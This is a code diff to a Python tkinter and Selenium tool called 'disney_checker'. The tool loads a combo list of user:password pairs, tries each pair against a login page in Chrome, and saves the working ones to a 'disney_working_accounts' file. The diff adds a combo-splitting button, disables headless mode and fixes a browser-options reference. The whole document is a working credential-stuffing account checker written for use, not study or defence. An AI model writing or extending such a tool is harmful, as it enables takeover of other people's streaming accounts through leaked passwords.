@@ -2,6 +2,7 @@ import time
 import os
 import requests
 import tkinter
+from split_combos import combo_splitter
 from tkinter import *
 from tkinter import ttk
 from bs4 import BeautifulSoup as soup
@@ -13,7 +14,9 @@ from pathlib import Path
 class disney_checker():
 
 	def __init__(self, root):
-	
+
+		self.split_combos_button = Button(root, text = 'Split Combos', font=('Arial', 12), command= combo_splitter('disney'))
+		self.split_combos_button.place(x=90, y=35)
 		self.account_checker_message = ''
 		self.combo_number = ''
 		self.concatenated_info = self.account_checker_message + self.combo_number
@@ -25,23 +28,23 @@ class disney_checker():
 		self.Two_Factor = False
 		self.browser_options = Options()
 		self.browser_options.add_argument = ('user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36')
-		self.browser_options.headless = True
+		#self.browser_options.headless = True
 		
 	def split_the_combos(self):
 		os.makedirs('accounts',exist_ok=True)
 		with open(self.file_directory, 'r') as disney:
 			for line in disney.readlines():
 					self.users.append(line.split(':')[0].strip())
-					self.passwords.append(line.split(':')[1].strip())
-					
-	def check_the_accounts(self):	
+					self.passwords.append(line.split(':')[1].strip())					
+	def check_the_accounts(self):
+		self.split_the_combos()
 		index = 0
 		while index != len(self.users):
 			with open('accounts/disney_working_accounts','a') as account_results:
 				self.checker_printout.place(x=100,y=100)
 				try:
 					print('\rTrying Combo {} out of {}'.format(index+1, len(self.users)),end='')
-					browser = webdriver.Chrome(options = browser_options)
+					browser = webdriver.Chrome(options = self.browser_options)
 					browser.set_window_size(500,700)
 					browser.get(page)
 					time.sleep(7)
